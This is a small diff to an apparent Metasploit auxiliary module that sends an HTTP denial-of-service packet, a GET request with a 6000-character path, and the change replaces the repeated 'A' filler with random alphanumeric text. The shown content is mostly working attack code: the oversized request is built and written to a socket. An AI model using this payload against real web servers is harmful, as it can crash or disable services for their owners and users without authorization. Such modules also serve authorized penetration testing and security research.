@@ -44,7 +44,7 @@ class Metasploit3 < Msf::Auxiliary
 
     print_status("Sending HTTP DoS Packet")
 
-    biggot = "GET " + "\x41" * 6000 + " HTTP/1.1"
+    biggot = "GET " +  Rex::Text.rand_text_alphanumeric(6000) + " HTTP/1.1"
     sock.put(biggot + "\r\n\r\n")
 
     disconnect
